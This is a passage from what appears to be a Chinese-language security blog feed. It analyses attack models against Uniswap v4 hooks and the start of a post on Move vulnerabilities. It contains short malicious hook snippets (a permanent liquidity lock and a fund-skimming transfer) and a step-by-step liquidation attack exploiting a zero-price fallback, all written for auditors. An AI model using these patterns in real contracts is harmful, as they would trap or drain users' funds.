资金到外部合约。审计奖励机制是否公平。</p><p>📌 <strong>协议不会阻止你</strong></p><blockquote><p><strong>v4 的设计哲学：<br>不限制作恶，只保证结算安全</strong></p></blockquote><hr><h3 id="5-4-beforeRemoveLiquidity-afterRemoveLiquidity"><a href="#5-4-beforeRemoveLiquidity-afterRemoveLiquidity" class="headerlink" title="5.4 beforeRemoveLiquidity &#x2F; afterRemoveLiquidity"></a>5.4 beforeRemoveLiquidity &#x2F; afterRemoveLiquidity</h3><p><strong>“你以为你能走？”</strong></p><hr><h4 id="beforeRemoveLiquidity"><a href="#beforeRemoveLiquidity" class="headerlink" title="beforeRemoveLiquidity"></a>beforeRemoveLiquidity</h4><p>常见用途：</p><ul><li>提前退出罚金</li><li>强制冷却期</li><li>LP 生命周期控制</li></ul><p>🚨 <strong>高风险设计</strong>：</p><ul><li>Hook 设置一个永远不满足的条件</li><li>LP 永久被锁死</li></ul><p><strong>代码说明</strong>：可以实施退出限制，如收取罚金或要求等待期。</p><p><strong>参数：</strong> <code>PoolKey calldata key, IPoolManager.ModifyLiquidityParams calldata params</code> - 流动性移除参数。</p><p><strong>返回值：</strong> <code>bytes4</code> - 必须是 <code>IHooks.beforeRemoveLiquidity.selector</code>。</p><p><strong>安全注意：</strong> 确保条件合理，否则 LP 资金被锁。检查是否与治理结合使用。</p><hr><h4 id="afterRemoveLiquidity"><a href="#afterRemoveLiquidity" class="headerlink" title="afterRemoveLiquidity"></a>afterRemoveLiquidity</h4><p>可以：</p><ul><li>清算外部仓位</li><li>计算最终收益</li></ul><p>❌ 但如果 Hook 写成：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">revert(&quot;Not allowed&quot;);</span><br></pre></td></tr></table></figure><p>LP <strong>永远拿不回钱</strong></p><p><strong>代码说明</strong>：在移除后，可以执行清理逻辑，如关闭外部仓位。</p><p><strong>参数：</strong> <code>PoolKey calldata key, IPoolManager.ModifyLiquidityParams calldata params, BalanceDelta delta</code> - 包括移除的流动性。</p><p><strong>返回值：</strong> <code>bytes4</code> - 必须是 <code>IHooks.afterRemoveLiquidity.selector</code>。</p><p><strong>安全注意：</strong> 不能 revert 来阻止移除，只能执行后续逻辑。审计外部调用是否安全。</p><hr><h3 id="5-5-beforeSwap-——-v4-中最强、最危险的-Hook"><a href="#5-5-beforeSwap-——-v4-中最强、最危险的-Hook" class="headerlink" title="5.5 beforeSwap —— v4 中最强、最危险的 Hook"></a>5.5 beforeSwap —— <strong>v4 中最强、最危险的 Hook</strong></h3><hr><h4 id="beforeSwap-能干什么？"><a href="#beforeSwap-能干什么？" class="headerlink" title="beforeSwap 能干什么？"></a>beforeSwap 能干什么？</h4><ul><li>修改 fee</li><li>拒绝交易</li><li>插入限价单</li><li>执行 TWAMM</li><li>MEV 防护</li><li>Oracle 校验</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (volatility &gt; threshold) &#123;</span><br><span class="line">    feeBps = highFee;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码说明</strong>：Hook 可以动态调整手续费，或实现复杂逻辑如限价单。</p><p><strong>参数：</strong> <code>PoolKey calldata key, IPoolManager.SwapParams calldata params</code> - 交换参数。</p><p><strong>返回值：</strong> <code>bytes4</code> - 必须是 <code>IHooks.beforeSwap.selector</code>。</p><p><strong>安全注意：</strong> 不能依赖未更新的状态。修改参数需谨慎。</p><hr><h4 id="beforeSwap-不能假设什么？"><a href="#beforeSwap-不能假设什么？" class="headerlink" title="beforeSwap 不能假设什么？"></a>beforeSwap 不能假设什么？</h4><p>❌ <code>balanceOf</code><br>❌ 交易最终价格<br>❌ Tick 一定会移动<br>❌ 交易一定完成</p><hr><h4 id="经典攻击模式-①：价格幻觉攻击"><a href="#经典攻击模式-①：价格幻觉攻击" class="headerlink" title="经典攻击模式 ①：价格幻觉攻击"></a>经典攻击模式 ①：价格幻觉攻击</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint price = getPriceFromPoolState();</span><br><span class="line">require(price &gt; x);</span><br></pre></td></tr></table></figure><p>但：</p><ul><li>swap 尚未发生</li><li>Tick 尚未更新</li></ul><p>👉 <strong>逻辑永远是错的</strong></p><hr><h3 id="5-6-afterSwap-——“收尾，但不是结算”"><a href="#5-6-afterSwap-——“收尾，但不是结算”" class="headerlink" title="5.6 afterSwap ——“收尾，但不是结算”"></a>5.6 afterSwap ——“收尾，但不是结算”</h3><p>afterSwap 执行时：</p><ul><li>AMM 状态已更新</li><li><strong>钱仍未结算</strong></li><li>Flash Accounting 仍在</li></ul><p>适合做：</p><ul><li>统计</li><li>触发器</li><li>风险监控</li></ul><p>❌ 不适合：</p><ul><li>再次 swap（可能 reentrancy）</li><li>依赖真实余额</li></ul><p><strong>代码说明</strong>：用于记录统计或触发外部事件。</p><p><strong>参数：</strong> <code>PoolKey calldata key, IPoolManager.SwapParams calldata params, BalanceDelta delta</code> - 包括交换结果。</p><p><strong>返回值：</strong> <code>bytes4</code> - 必须是 <code>IHooks.afterSwap.selector</code>。</p><p><strong>安全注意：</strong> 避免重入。不能修改结算。</p><hr><h2 id="第六章：Hooks-的安全模型-——“信任的彻底转移”"><a href="#第六章：Hooks-的安全模型-——“信任的彻底转移”" class="headerlink" title="第六章：Hooks 的安全模型 ——“信任的彻底转移”"></a>第六章：Hooks 的安全模型 ——“信任的彻底转移”</h2><h3 id="6-1-v3-vs-v4-信任模型对比"><a href="#6-1-v3-vs-v4-信任模型对比" class="headerlink" title="6.1 v3 vs v4 信任模型对比"></a>6.1 v3 vs v4 信任模型对比</h3><table><thead><tr><th></th><th>v3</th><th>v4</th></tr></thead><tbody><tr><td>用户信任</td><td>协议</td><td>协议 + Hook</td></tr><tr><td>LP 风险</td><td>IL</td><td>IL + Hook 风险</td></tr><tr><td>攻击面</td><td>固定</td><td><strong>无限扩展</strong></td></tr></tbody></table><hr><h3 id="6-2-PoolManager-的责任边界"><a href="#6-2-PoolManager-的责任边界" class="headerlink" title="6.2 PoolManager 的责任边界"></a>6.2 PoolManager 的责任边界</h3><p>PoolManager 只保证：</p><ul><li>资产不会被直接偷走</li><li>结算规则不被破坏</li><li>池子之间不互相污染</li></ul><p><strong>它不保证：</strong></p><ul><li>Hook 是善意的</li><li>策略是合理的</li><li>LP 能拿回钱</li></ul><hr><h2 id="第七章：Hooks-的-6-类典型漏洞"><a href="#第七章：Hooks-的-6-类典型漏洞" class="headerlink" title="第七章：Hooks 的 6 类典型漏洞"></a>第七章：Hooks 的 6 类典型漏洞</h2><h3 id="7-1-重入（Reentrancy）"><a href="#7-1-重入（Reentrancy）" class="headerlink" title="7.1 重入（Reentrancy）"></a>7.1 重入（Reentrancy）</h3><ul><li>Hook → 外部协议 → 回调 → PoolManager</li></ul><p>⚠️ Flash Accounting 状态未结算</p><hr><h3 id="7-2-依赖未结算余额"><a href="#7-2-依赖未结算余额" class="headerlink" title="7.2 依赖未结算余额"></a>7.2 依赖未结算余额</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">token.balanceOf(address(this))</span><br></pre></td></tr></table></figure><p><strong>永远不可信</strong></p><hr><h3 id="7-3-永久锁仓（Soft-Rug）"><a href="#7-3-永久锁仓（Soft-Rug）" class="headerlink" title="7.3 永久锁仓（Soft Rug）"></a>7.3 永久锁仓（Soft Rug）</h3><ul><li>beforeRemoveLiquidity 永远 revert</li><li>afterRemoveLiquidity 吞钱</li></ul><hr><h3 id="7-4-恶意-fee-滑点操纵"><a href="#7-4-恶意-fee-滑点操纵" class="headerlink" title="7.4 恶意 fee &#x2F; 滑点操纵"></a>7.4 恶意 fee &#x2F; 滑点操纵</h3><ul><li>beforeSwap 动态提高 fee</li><li>针对特定地址歧视</li></ul><hr><h3 id="7-5-Oracle-操纵"><a href="#7-5-Oracle-操纵" class="headerlink" title="7.5 Oracle 操纵"></a>7.5 Oracle 操纵</h3><ul><li>使用弱 TWAP</li><li>使用可被操纵的外部价格</li></ul><hr><h3 id="7-6-Hook-升级风险"><a href="#7-6-Hook-升级风险" class="headerlink" title="7.6 Hook 升级风险"></a>7.6 Hook 升级风险</h3><ul><li>可升级 Hook &#x3D; 治理后门</li><li>LP 资产暴露在治理攻击中</li></ul><hr><h1 id="关于-Uniswap-v4-攻击模型"><a href="#关于-Uniswap-v4-攻击模型" class="headerlink" title="关于 Uniswap v4 攻击模型"></a>关于 Uniswap v4 攻击模型</h1><h2 id="第一章：v4-攻击面的根本变化"><a href="#第一章：v4-攻击面的根本变化" class="headerlink" title="第一章：v4 攻击面的根本变化"></a>第一章：v4 攻击面的根本变化</h2><h3 id="1-1-从协议漏洞到协议允许的作恶"><a href="#1-1-从协议漏洞到协议允许的作恶" class="headerlink" title="1.1 从协议漏洞到协议允许的作恶"></a>1.1 从协议漏洞到协议允许的作恶</h3><p>在 Uniswap v2 &#x2F; v3 的时代，安全模型非常清晰：</p><ul><li>协议逻辑固定</li><li>行为空间受限</li><li>攻击 ≈ 利用 bug 或数学边界</li></ul><p>换句话说：</p><blockquote><p><strong>只要协议代码没 bug，用户基本安全</strong></p></blockquote><hr><h4 id="v4-的范式转移"><a href="#v4-的范式转移" class="headerlink" title="v4 的范式转移"></a>v4 的范式转移</h4><p>Uniswap v4 的核心改变并不在于 AMM 数学，而在于<strong>权力下放</strong>：</p><ul><li>核心 AMM 逻辑被极度压缩（PoolManager）</li><li>几乎所有”策略性行为”被移交给 Hook</li></ul><p>这意味着：</p><blockquote><p><strong>“是否安全”不再是 Uniswap 决定的，而是 Hook 作者决定的</strong></p></blockquote><hr><h4 id="攻击不再需要违反协议假设"><a href="#攻击不再需要违反协议假设" class="headerlink" title="攻击不再需要违反协议假设"></a>攻击不再需要违反协议假设</h4><p>在 v4 中，以下行为：</p><ul><li>阻止用户移除流动性</li><li>对某些用户收取极高费用</li><li>在 swap 后抽取资产</li><li>在特定条件下 revert 交易</li></ul><p><strong>全部是合法行为</strong>。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">⚠️ 合法 ≠ 安全</span><br></pre></td></tr></table></figure><hr><h3 id="1-2-攻击者模型的根本变化"><a href="#1-2-攻击者模型的根本变化" class="headerlink" title="1.2 攻击者模型的根本变化"></a>1.2 攻击者模型的根本变化</h3><p>传统 DeFi 攻击者：</p><ul><li>外部套利者</li><li>闪电贷操作者</li><li>MEV bot</li></ul><p>v4 新增攻击者：</p><h4 id="1️⃣-Hook-作者（最强）"><a href="#1️⃣-Hook-作者（最强）" class="headerlink" title="1️⃣ Hook 作者（最强）"></a>1️⃣ Hook 作者（最强）</h4><p>Hook 作者拥有：</p><ul><li>对所有 swap &#x2F; mint &#x2F; burn 的同步控制权</li><li>可访问未结算状态</li><li>可执行外部调用</li></ul><p>这在安全模型中，<strong>等价于半个协议管理员</strong>。</p><hr><h4 id="2️⃣-治理攻击者"><a href="#2️⃣-治理攻击者" class="headerlink" title="2️⃣ 治理攻击者"></a>2️⃣ 治理攻击者</h4><p>如果 Hook 可升级：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function upgradeHook(address newHook) external onlyGov;</span><br></pre></td></tr></table></figure><p>那么治理被攻破 ≈ 池子被完全接管。</p><hr><h4 id="3️⃣-项目方-Rug"><a href="#3️⃣-项目方-Rug" class="headerlink" title="3️⃣ 项目方 Rug"></a>3️⃣ 项目方 Rug</h4><p>最危险的一类：</p><ul><li>初期 Hook 看似无害</li><li>TVL 上来后升级 Hook</li><li>LP 被锁、被抽血、无法逃离</li></ul><p>📌 <strong>这在 v4 中不需要任何漏洞</strong></p><hr><h2 id="第二章：Flash-Accounting-——-所有错觉的源头"><a href="#第二章：Flash-Accounting-——-所有错觉的源头" class="headerlink" title="第二章：Flash Accounting —— 所有错觉的源头"></a>第二章：Flash Accounting —— 所有错觉的源头</h2><h3 id="2-1-Flash-Accounting-的真实含义"><a href="#2-1-Flash-Accounting-的真实含义" class="headerlink" title="2.1 Flash Accounting 的真实含义"></a>2.1 Flash Accounting 的真实含义</h3><p>在 v4 中，Uniswap 为了极致 gas 优化，引入：</p><blockquote><p><strong>延迟结算模型（Deferred Settlement）</strong></p></blockquote><p>整个交易流程中：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Swap / Mint / Burn</span><br><span class="line">↓</span><br><span class="line">Hook 回调</span><br><span class="line">↓</span><br><span class="line">Hook 回调</span><br><span class="line">↓</span><br><span class="line">……</span><br><span class="line">↓</span><br><span class="line">统一结算</span><br></pre></td></tr></table></figure><p>期间：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mapping(address token =&gt; mapping(address user =&gt; int256 delta));</span><br></pre></td></tr></table></figure><p><strong>代码说明</strong>：这个映射记录了每个用户对每个代币的净债务或债权。<code>int256 delta</code> 可以是正数（欠款）或负数（债权），在交易结束时统一结算，避免了多次转账调用。</p><hr><h3 id="2-2-关键安全误区：余额-≠-状态"><a href="#2-2-关键安全误区：余额-≠-状态" class="headerlink" title="2.2 关键安全误区：余额 ≠ 状态"></a>2.2 关键安全误区：余额 ≠ 状态</h3><p>几乎所有 DeFi 开发者都会犯这个错：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint bal = token.balanceOf(address(this));</span><br></pre></td></tr></table></figure><p>在 v4 中：</p><ul><li>bal 是旧余额</li><li>不反映 swap&#x2F;mint&#x2F;burn 的任何变化</li></ul><hr><h3 id="2-3-攻击路径：基于余额检查的逻辑绕过"><a href="#2-3-攻击路径：基于余额检查的逻辑绕过" class="headerlink" title="2.3 攻击路径：基于余额检查的逻辑绕过"></a>2.3 攻击路径：基于余额检查的逻辑绕过</h3><h4 id="场景假设"><a href="#场景假设" class="headerlink" title="场景假设"></a>场景假设</h4><p>Hook 设计者想限制 swap 后某个条件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function afterSwap(...) &#123;</span><br><span class="line">    require(token.balanceOf(address(this)) &gt;= threshold);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><ol><li>攻击者发起 swap</li><li>swap 尚未结算</li><li>afterSwap 中 balance 未变</li><li>require 被绕过</li><li>结算发生</li></ol><p>📌 <strong>没有重入</strong><br>📌 <strong>没有 bug</strong><br>📌 <strong>只是时间认知错误</strong></p><p>以下是易受攻击的 Hook 代码示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function afterSwap(PoolKey calldata key, IPoolManager.SwapParams calldata params, BalanceDelta delta) external &#123;</span><br><span class="line">    uint256 balance = IERC20(token).balanceOf(address(this));</span><br><span class="line">    require(balance &gt;= minReserve, &quot;Insufficient reserve&quot;);</span><br><span class="line">    </span><br><span class="line">    // 执行奖励逻辑</span><br><span class="line">    rewardToken.mint(msg.sender, rewardAmount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码说明</strong>：这个 Hook 错误地使用了 <code>balanceOf</code>，在 Flash Accounting 下余额尚未更新，导致条件检查失效，可能允许不当的奖励发放。</p><hr><h3 id="2-4-Flash-Accounting-回调的致命组合"><a href="#2-4-Flash-Accounting-回调的致命组合" class="headerlink" title="2.4 Flash Accounting + 回调的致命组合"></a>2.4 Flash Accounting + 回调的致命组合</h3><p>当 Hook 中出现：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ERC777(token).transfer(...)</span><br></pre></td></tr></table></figure><p>就会发生：</p><ol><li>Hook 执行</li><li>ERC777 回调</li><li>回调中再次触发 PoolManager</li><li>原交易尚未结算</li></ol><p>结果：</p><blockquote><p><strong>多个逻辑层认为自己在”第一层执行”</strong></p></blockquote><hr><h2 id="第三章：Hook-主导型攻击（核心）"><a href="#第三章：Hook-主导型攻击（核心）" class="headerlink" title="第三章：Hook 主导型攻击（核心）"></a>第三章：Hook 主导型攻击（核心）</h2><h3 id="3-1-为什么-Hook-是最强攻击向量"><a href="#3-1-为什么-Hook-是最强攻击向量" class="headerlink" title="3.1 为什么 Hook 是最强攻击向量"></a>3.1 为什么 Hook 是最强攻击向量</h3><p>Hook 的权限本质是：</p><blockquote><p><strong>对 AMM 状态机的同步中断权</strong></p></blockquote><p>它可以：</p><ul><li>拒绝任何状态转换</li><li>修改参数</li><li>执行外部逻辑</li></ul><hr><h3 id="3-2-永久锁仓攻击（LP-视角）"><a href="#3-2-永久锁仓攻击（LP-视角）" class="headerlink" title="3.2 永久锁仓攻击（LP 视角）"></a>3.2 永久锁仓攻击（LP 视角）</h3><h4 id="恶意-Hook"><a href="#恶意-Hook" class="headerlink" title="恶意 Hook"></a>恶意 Hook</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function beforeRemoveLiquidity(...) external returns (bytes4) &#123;</span><br><span class="line">    revert(&quot;Liquidity removal disabled&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码说明</strong>：这个 Hook 函数通过 <code>revert</code> 永久阻止流动性移除，导致 LP 无法取回资金。这是一种”软 Rug”攻击，利用协议允许的合法行为实现恶意目的。</p><h4 id="后果分析"><a href="#后果分析" class="headerlink" title="后果分析"></a>后果分析</h4><ul><li>LP 无法退出</li><li>无治理兜底</li><li>无 emergency withdraw</li></ul><p>📌 <strong>这是协议设计允许的行为</strong></p><hr><h3 id="3-3-afterAddLiquidity-抽血模型"><a href="#3-3-afterAddLiquidity-抽血模型" class="headerlink" title="3.3 afterAddLiquidity 抽血模型"></a>3.3 afterAddLiquidity 抽血模型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function afterAddLiquidity(...) external &#123;</span><br><span class="line">    uint skim = computeSkim();</span><br><span class="line">    token0.transfer(owner, skim);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>为什么危险？</strong></p><ul><li>LP 看到的池子参数是正常的</li><li>资金流失是渐进的</li><li>前端无法显示真实 APR</li></ul><hr><h3 id="3-4-歧视性-Fee-攻击（MEV-合谋）"><a href="#3-4-歧视性-Fee-攻击（MEV-合谋）" class="headerlink" title="3.4 歧视性 Fee 攻击（MEV 合谋）"></a>3.4 歧视性 Fee 攻击（MEV 合谋）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (tx.origin == routerX) &#123;</span><br><span class="line">    feeBps = 5000;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="攻击特性"><a href="#攻击特性" class="headerlink" title="攻击特性"></a>攻击特性</h4><ul><li>针对聚合器</li><li>针对大额用户</li><li>普通用户不触发</li></ul><p>📌 <strong>极难被发现</strong><br>📌 <strong>极适合 MEV 合谋</strong></p><hr><h2 id="第四章：Hook-×-Oracle-×-清算-——-资金清空级攻击模型"><a href="#第四章：Hook-×-Oracle-×-清算-——-资金清空级攻击模型" class="headerlink" title="第四章：Hook × Oracle × 清算 —— 资金清空级攻击模型"></a>第四章：Hook × Oracle × 清算 —— 资金清空级攻击模型</h2><h3 id="4-1-攻击背景：为什么-v4-特别容易被”假价格”击穿"><a href="#4-1-攻击背景：为什么-v4-特别容易被”假价格”击穿" class="headerlink" title="4.1 攻击背景：为什么 v4 特别容易被”假价格”击穿"></a>4.1 攻击背景：为什么 v4 特别容易被”假价格”击穿</h3><p>在 v2 &#x2F; v3 中：</p><ul><li>Oracle ≈ AMM 本身</li><li>清算价格来源单一</li><li>价格异常 ≈ 池子异常</li></ul><p>在 v4 中：</p><ul><li><p>Oracle 通常来自<strong>外部模块</strong></p></li><li><p>Hook 可以修改：</p><ul><li>是否允许清算</li><li>价格 fallback 行为</li><li>清算激励结构</li></ul></li></ul><p>👉 <strong>价格、清算、权限被解耦</strong></p><hr><h3 id="4-2-致命设计模式：price-0-→-price-1"><a href="#4-2-致命设计模式：price-0-→-price-1" class="headerlink" title="4.2 致命设计模式：price == 0 → price = 1"></a>4.2 致命设计模式：<code>price == 0 → price = 1</code></h3><h4 id="常见代码"><a href="#常见代码" class="headerlink" title="常见代码"></a>常见代码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(uint price, uint updatedAt, bool allowLiquidations) = getCollateralPrice();</span><br><span class="line"></span><br><span class="line">if (price == 0) &#123;</span><br><span class="line">    price = 1; // 防止除零</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开发者的直觉是：</p><blockquote><p>“价格为 0 不可能真实存在，<br>我只是防止 revert。”</p></blockquote><p>但在清算逻辑中：</p><blockquote><p><strong>price 是除数，而不是显示值</strong></p></blockquote><hr><h3 id="4-3-清算公式在低价下的数学灾难"><a href="#4-3-清算公式在低价下的数学灾难" class="headerlink" title="4.3 清算公式在低价下的数学灾难"></a>4.3 清算公式在低价下的数学灾难</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint collateralRewardValue =</span><br><span class="line">    repayAmount * (10000 + liqIncentiveBps) / 10000;</span><br><span class="line"></span><br><span class="line">uint internalCollateralReward =</span><br><span class="line">    collateralRewardValue * 1e18 / price;</span><br></pre></td></tr></table></figure><p><strong>代码说明</strong>：这段代码计算清算奖励。首先计算带激励的偿还价值，然后除以价格得到内部抵押奖励。当 <code>price = 1</code> 时，除法结果极大，可能导致攻击者获得全部抵押。</p><h4 id="当-price-1-时："><a href="#当-price-1-时：" class="headerlink" title="当 price = 1 时："></a>当 <code>price = 1</code> 时：</h4><ul><li><code>internalCollateralReward ≈ repayAmount × 1e18</code></li><li>即：<strong>repay 单位债务，按”1 wei &#x3D; 1 whole collateral”结算</strong></li></ul><p>随后：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">internalCollateralReward =</span><br><span class="line">    min(internalCollateralReward, collateralBalance);</span><br></pre></td></tr></table></figure><p>➡️ <strong>单次极小 repay，直接吃掉全部抵押</strong></p><hr><h3 id="4-4-完整攻击线路"><a href="#4-4-完整攻击线路" class="headerlink" title="4.4 完整攻击线路"></a>4.4 完整攻击线路</h3><h4 id="攻击前提"><a href="#攻击前提" class="headerlink" title="攻击前提"></a>攻击前提</h4><ol><li>Oracle 极度过时（staleness）</li><li>price 被 Hook &#x2F; Oracle fallback 改为 1</li><li><code>allowLiquidations == true</code></li><li>清算公式未设置下限保护</li></ol><hr><h4 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h4><p>1️⃣ <strong>等待 Oracle 进入极度过期状态</strong></p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">updatedAt &lt;&lt; block.timestamp - STALENESS_UNWIND_DURATION</span><br></pre></td></tr></table></figure><p>2️⃣ <strong>调用 <code>liquidate()</code>，repay 极小金额</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">liquidate(</span><br><span class="line">    borrower,</span><br><span class="line">    repayAmount = 1,</span><br><span class="line">    minCollateralOut = 0</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>3️⃣ <strong>内部计算</strong></p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">internalCollateralReward ≈ 1e18</span><br><span class="line">→ min(collateralBalance)</span><br><span class="line">→ 全部抵押</span><br></pre></td></tr></table></figure><p>4️⃣ <strong>攻击者获得全部抵押</strong></p><p>5️⃣ <strong>只偿还极少债务</strong></p><h2 id="第五章：Hook-×-Flash-Accounting-——-状态错觉攻击"><a href="#第五章：Hook-×-Flash-Accounting-——-状态错觉攻击" class="headerlink" title="第五章：Hook × Flash Accounting —— 状态错觉攻击"></a>第五章：Hook × Flash Accounting —— 状态错觉攻击</h2><blockquote><p><strong>v4 中最容易被忽视、但最普遍的攻击模型</strong></p></blockquote><hr><h3 id="5-1-攻击核心：Hook-运行在”未结算世界”"><a href="#5-1-攻击核心：Hook-运行在”未结算世界”" class="headerlink" title="5.1 攻击核心：Hook 运行在”未结算世界”"></a>5.1 攻击核心：Hook 运行在”未结算世界”</h3><p>在 v4 中，Hook 执行时：</p><ul><li>swap 已”逻辑发生”</li><li>token 尚未转账</li><li>balanceOf 是旧值</li></ul><p>👉 <strong>Hook 看到的是”平行宇宙”</strong></p><hr><h3 id="5-2-典型错误代码"><a href="#5-2-典型错误代码" class="headerlink" title="5.2 典型错误代码"></a>5.2 典型错误代码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function afterSwap(...) external &#123;</span><br><span class="line">    uint bal = token.balanceOf(address(this));</span><br><span class="line">    require(bal &gt;= minRequired);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开发者误以为：</p><blockquote><p>“swap 已完成”</p></blockquote><p>但事实是：</p><blockquote><p><strong>只是 AMM 状态推进了，钱还没动</strong></p></blockquote><hr><h3 id="5-3-攻击模型：条件绕过型抽血"><a href="#5-3-攻击模型：条件绕过型抽血" class="headerlink" title="5.3 攻击模型：条件绕过型抽血"></a>5.3 攻击模型：条件绕过型抽血</h3><h4 id="攻击流程-1"><a href="#攻击流程-1" class="headerlink" title="攻击流程"></a>攻击流程</h4><ol><li><p>Hook 设定一个 balance 门槛</p></li><li><p>攻击者构造 swap</p></li><li><p>afterSwap 中：</p><ul><li>balance 未变</li><li>条件通过</li></ul></li><li><p>Hook 执行奖励 &#x2F; 转账逻辑</p></li><li><p>最后统一结算</p></li></ol><p>📌 <strong>Hook 自己骗了自己</strong></p><hr><h3 id="5-4-Flash-Accounting-ERC777-的复合地狱"><a href="#5-4-Flash-Accounting-ERC777-的复合地狱" class="headerlink" title="5.4 Flash Accounting + ERC777 的复合地狱"></a>5.4 Flash Accounting + ERC777 的复合地狱</h3><h4 id="危险代码"><a href="#危险代码" class="headerlink" title="危险代码"></a>危险代码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IERC777(token).transfer(to, amount);</span><br></pre></td></tr></table></figure><p><strong>代码说明</strong>：使用 ERC777 代币的 <code>transfer</code> 函数会触发接收者的回调函数。如果回调中再次调用 PoolManager，可能导致重入攻击，尤其在 Flash Accounting 未结算的状态下。</p><p>ERC777 会：</p><ul><li>在 transfer 中回调接收方</li><li>回调中可再次调用 PoolManager</li></ul><p>结果：</p><blockquote><p><strong>Hook 在一个尚未结算的交易里，被多次重入</strong></p></blockquote><p>而开发者通常认为：</p><blockquote><p>“我没有 external call 到 PoolManager”</p></blockquote><p>但事实是：</p><blockquote><p><strong>你调用的 token 帮你 call 了</strong></p></blockquote><hr><h3 id="5-5-攻击效果"><a href="#5-5-攻击效果" class="headerlink" title="5.5 攻击效果"></a>5.5 攻击效果</h3><ul><li>状态错乱</li><li>delta 累加异常</li><li>fee 计算被绕</li><li>LP 资产被重复计算</li></ul><p>📌 <strong>不是传统 reentrancy</strong><br>📌 <strong>是 v4 独有的时间错位攻击</strong></p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> 基本知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MOVE漏洞总结</title>
      <link href="/2025/08/29/MOVE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2025/08/29/MOVE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="Move-语言智能合约安全：10-个经典漏洞深度剖析"><a href="#Move-语言智能合约安全：10-个经典漏洞深度剖析" class="headerlink" title="Move 语言智能合约安全：10 个经典漏洞深度剖析"></a>Move 语言智能合约安全：10 个经典漏洞深度剖析</h1><p>Move 是一种专为资产安全和可信赖性而设计的编程语言，它的核心理念是通过其独特的**资源类型系统（Resource Type System）**来从根本上防止资产被复制、意外销毁或丢失。它在编译时强制执行这些规则，从而在很大程度上避免了许多传统区块链语言中常见的致命漏洞，比如代币重复发行或意外丢失。</p><p>然而，尽管 Move 提供了强大的安全保障，但合约的安全性最终还是取决于开发者的设计和实现。不正确的逻辑、对 Move 特性的误解或编程上的疏忽，仍然可能引入严重的漏洞。</p><p>本文件将对 Move 智能合约中 10 个常见且潜在的漏洞类型进行深度剖析，旨在帮助开发者更好地理解语言陷阱，并编写出更健壮、更安全的合约。</p><hr><h3 id="1-资产权限管理不当-Improper-Capability-Management"><a href="#1-资产权限管理不当-Improper-Capability-Management" class="headerlink" title="1. 资产权限管理不当 (Improper Capability Management)"></a>1. 资产权限管理不当 (Improper Capability Management)</h3><p><strong>核心原理：</strong></p><p>在 Move 中，<strong>能力 (Capability)</strong> 是一种特殊的资源类型，它代表了对特定操作的权限。这是一种强大的访问控制机制，例如，一个 <code>AdminCap</code> 资源可以授予持有者调用管理函数的权限。这种模式比依赖于硬编码的地址更安全，因为能力可以像普通资产一样被转移或销毁。</p><p><strong>漏洞描述：</strong></p><p>当开发者没有正确地管理这些能力资源时，就会导致权限泄露或被滥用。这通常发生在以下几种情况：</p><ul><li><strong>能力泄露 (Capability Leakage):</strong> 这是最危险的情况。当一个能力资源被错误地存储在公共可访问的结构体中，或者在一个不安全的函数中被意外返回，任何用户都可以获取并滥用该权限。</li><li><strong>非预期的能力转移 (Unintended Capability Transfer):</strong> 在函数调用中，开发者意外地将能力作为参数传递给一个不应拥有此权限的模块或函数。这使得该模块获得了超越其设计权限的能力，可能被用于恶意目的。</li><li><strong>未撤销的能力 (Unrevoked Capabilities):</strong> 在合约升级或状态变更后，旧的能力没有被正确地销毁或撤销。这可能导致旧的、不再有效的能力仍然可以被用来执行过时的或不安全的操作，造成合约状态的不一致。</li></ul><p><strong>伪代码示例 (能力泄露):</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">module my_contract::cap_leak &#123;</span><br><span class="line">    use std::signer;</span><br><span class="line"></span><br><span class="line">    // 错误的实现: AdminCap 被作为公共资源存储在用户账户下</span><br><span class="line">    // 任何拥有该 AdminCap 资源的用户都可以调用特权函数</span><br><span class="line">    struct AdminCap has key, store &#123; &#125;</span><br><span 